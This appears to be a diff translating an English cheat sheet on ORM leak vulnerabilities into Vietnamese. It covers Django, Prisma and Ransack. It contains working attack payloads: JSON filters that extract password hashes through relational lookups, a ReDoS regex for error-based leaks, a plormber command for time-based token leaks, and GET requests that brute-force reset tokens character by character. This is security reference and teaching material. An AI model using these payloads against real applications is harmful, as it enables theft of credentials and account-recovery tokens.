@@ -1,38 +1,43 @@
 # ORM Leak
 
-> An ORM leak vulnerability occurs when sensitive information, such as database structure or user data, is unintentionally exposed due to improper handling of ORM queries. This can happen if the application returns raw error messages, debug information, or allows attackers to manipulate queries in ways that reveal underlying data.
+> Lỗ hổng ORM Leak xảy ra khi các thông tin nhạy cảm, chẳng hạn như cấu trúc cơ sở dữ liệu hoặc dữ liệu người dùng, vô tình bị tiết lộ do xử lý các truy vấn ORM không đúng cách. Điều này có thể xảy ra khi ứng dụng trả về thông báo lỗi thô, thông tin debug hoặc cho phép kẻ tấn công thao túng truy vấn theo những cách làm lộ dữ liệu bên dưới.
 
-## Summary
+## Tóm tắt
 
 * [Django (Python)](#django-python)
-    * [Query filter](#query-filter)
-    * [Relational Filtering](#relational-filtering)
-        * [One-to-One](#one-to-one)
-        * [Many-to-Many](#many-to-many)
-    * [Error-based leaking - ReDOS](#error-based-leaking---redos)
+
+  * [Bộ lọc truy vấn](#query-filter)
+  * [Lọc quan hệ](#relational-filtering)
+
+    * [One-to-One](#one-to-one)
+    * [Many-to-Many](#many-to-many)
+  * [Rò rỉ dựa trên lỗi - ReDOS](#error-based-leaking---redos)
 * [Prisma (Node.JS)](#prisma-nodejs)
-    * [Relational Filtering](#relational-filtering-1)
-        * [One-to-One](#one-to-one-1)
-        * [Many-to-Many](#many-to-many-1)
+
+  * [Lọc quan hệ](#relational-filtering-1)
+
+    * [One-to-One](#one-to-one-1)
+    * [Many-to-Many](#many-to-many-1)
 * [Ransack (Ruby)](#ransack-ruby)
 * [CVE](#cve)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
 ## Django (Python)
 
-The following code is a basic example of an ORM querying the database.
+Đoạn code sau là một ví dụ cơ bản về ORM thực hiện truy vấn cơ sở dữ liệu.
 
 ```py
 users = User.objects.filter(**request.data)
 serializer = UserSerializer(users, many=True)
 ```
 
-The problem lies in how the Django ORM uses keyword parameter syntax to build QuerySets. By utilizing the unpack operator (`**`), users can dynamically control the keyword arguments passed to the filter method, allowing them to filter results according to their needs.
+Vấn đề nằm ở cách Django ORM sử dụng cú pháp tham số keyword để xây dựng QuerySet. Bằng cách sử dụng toán tử unpack (`**`), người dùng có thể kiểm soát động các keyword argument được truyền vào phương thức `filter`, cho phép họ lọc kết quả theo nhu cầu.
 
-### Query filter
+### Bộ lọc truy vấn
 
-The attacker can control the column to filter results by.
-The ORM provides operators for matching parts of a value. These operators can utilize the SQL LIKE condition in generated queries, perform regex matching based on user-controlled patterns, or apply comparison operators such as < and >.
+Kẻ tấn công có thể kiểm soát cột được sử dụng để lọc kết quả.
+
+ORM cung cấp các operator để so khớp một phần của giá trị. Các operator này có thể sử dụng điều kiện SQL `LIKE` trong các truy vấn được tạo ra, thực hiện so khớp regex dựa trên pattern do người dùng kiểm soát hoặc áp dụng các toán tử so sánh như `<` và `>`.
 
 ```json
 {
@@ -41,26 +46,26 @@ The ORM provides operators for matching parts of a value. These operators can ut
 }
 ```
 
-Interesting filter to use:
+Các bộ lọc đáng chú ý:
 
 * `__startswith`
 * `__contains`
 * `__regex`
 
-### Relational Filtering
+### Lọc quan hệ
 
-Let's use this great example from [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)
+Hãy sử dụng ví dụ này từ [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)
 
 ![UML-example-app-simplified-highlight](https://cdn.prod.website-files.com/6971f0e051b588235e8acf7b/69c28ab386b7948b108ecc8b_69b98986947782073459457e_UML-example-app-simplified-highlight1.avif)
 
-We can see 2 type of relationships:
+Có thể thấy 2 loại quan hệ:
 
-* One-to-One relationships
-* Many-to-Many Relationships
+* Quan hệ One-to-One
+* Quan hệ Many-to-Many
 
 #### One-to-One
 
-Filtering through user that created an article, and having a password containing the character `p`.
+Lọc thông qua user đã tạo một article và kiểm tra xem password có chứa ký tự `p` hay không.
 
 ```json
 {
@@ -70,13 +75,13 @@ Filtering through user that created an article, and having a password containing
 
 #### Many-to-Many
 
-Almost the same thing but you need to filter more.
+Gần giống trường hợp trên nhưng cần thực hiện lọc nhiều hơn.
 
-* Get the user IDS: `created_by__departments__employees__user__id`
-* For each ID, get the username: `created_by__departments__employees__user__username`
-* Finally, leak their password hash: `created_by__departments__employees__user__password`
+* Lấy ID của user: `created_by__departments__employees__user__id`
+* Với mỗi ID, lấy username: `created_by__departments__employees__user__username`
+* Cuối cùng, làm rò rỉ password hash của họ: `created_by__departments__employees__user__password`
 
-Use multiple filters in the same request:
+Sử dụng nhiều bộ lọc trong cùng một request:
 
 ```json
 {
@@ -85,45 +90,45 @@ Use multiple filters in the same request:
 }
 ```
 
-### Error-based leaking - ReDOS
+### Rò rỉ dựa trên lỗi - ReDOS
 
-If Django use MySQL, you can also abuse a ReDOS to force an error when the filter does not properly match the condition.
+Nếu Django sử dụng MySQL, cũng có thể lợi dụng ReDOS để buộc ứng dụng tạo lỗi khi bộ lọc không khớp chính xác với điều kiện.
 
 ```json
 {"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
-// => Return something
+// => Trả về kết quả
 
 {"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
-// => Error 500 (Timeout exceeded in regular expression match)
+// => Lỗi 500 (Timeout exceeded in regular expression match)
 ```
 
 ## Prisma (Node.JS)
 
-**Tools**:
+**Công cụ**:
 
-* [elttam/plormber](https://github.com/elttam/plormber) - tool for exploiting ORM Leak time-based vulnerabilities
+* https://github.com/elttam/plormber - công cụ khai thác các lỗ hổng ORM Leak dựa trên thời gian
 
-    ```ps1
-    plormber prisma-contains \
-        --chars '0123456789abcdef' \
-        --base-query-json '{"query": {PAYLOAD}}' \
-        --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
-        --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
-        --verbose-stats \
-        https://some.vuln.app/articles/time-based;
-    ```
+  ```ps1
+  plormber prisma-contains \
+      --chars '0123456789abcdef' \
+      --base-query-json '{"query": {PAYLOAD}}' \
+      --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
+      --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
+      --verbose-stats \
+      https://some.vuln.app/articles/time-based;
+  ```
 
-**Example**:
+**Ví dụ**:
 
-Example of an ORM leak in Node.JS with Prisma.
+Ví dụ về ORM Leak trong Node.JS với Prisma.
 
 ```js
 const posts = await prisma.article.findMany({
-  where: req.query.filter as any // Vulnerable to ORM Leaks
+  where: req.query.filter as any // Dễ bị ORM Leak
 })
 ```
 
-Use the include to return all the fields of user records that have created an article
+Sử dụng `include` để trả về tất cả các trường của user record đã tạo article:
 
 ```json
 {
@@ -135,7 +140,7 @@ Use the include to return all the fields of user records that have created an ar
 }
 ```
 
-Select only one field
+Chỉ chọn một trường:
 
 ```json
 {
@@ -151,7 +156,7 @@ Select only one field
 }
 ```
 
-### Relational Filtering
+### Lọc quan hệ
 
 #### One-to-One
 
@@ -197,26 +202,26 @@ Select only one field
 
 ## Ransack (Ruby)
 
-Only in Ransack < `4.0.0`.
+Chỉ áp dụng với Ransack < `4.0.0`.
 
-![ransack_bruteforce_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)
+![ransack\_bruteforce\_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)
 
-* Extracting the `reset_password_token` field of a user
+* Trích xuất trường `reset_password_token` của một user:
 
-    ```ps1
-    GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=2 -> Results in page
+  ```ps1
+  GET /posts?q[user_reset_password_token_start]=0 -> Trang kết quả trống
+  GET /posts?q[user_reset_password_token_start]=1 -> Trang kết quả trống
+  GET /posts?q[user_reset_password_token_start]=2 -> Có kết quả trên trang
 
-    GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
-    GET /posts?q[user_reset_password_token_start]=2f -> Results in page
-    ```
+  GET /posts?q[user_reset_password_token_start]=2c -> Trang kết quả trống
+  GET /posts?q[user_reset_password_token_start]=2f -> Có kết quả trên trang
+  ```
 
-* Target a specific user and extract his `recoveries_key`
+* Nhắm đến một user cụ thể và trích xuất `recoveries_key` của user đó:
 
-    ```ps1
-    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
-    ```
+  ```ps1
+  GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
+  ```
 
 ## CVE
 
@@ -224,7 +229,7 @@ Only in Ransack < `4.0.0`.
 * [CVE-2023-31133: Ghost CMS ORM Leak](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)
 * [CVE-2023-30843: Payload CMS ORM Leak](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)
 
-## References
+## Tài liệu tham khảo
 
 * [ORM Injection - HackTricks - July 30, 2024](https://web.archive.org/web/20241230091620/https://book.hacktricks.xyz/pentesting-web/orm-injection)
 * [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://web.archive.org/web/20260118225011/https://pentesterlab.com/blog/orm-leak-with-sqlite3)
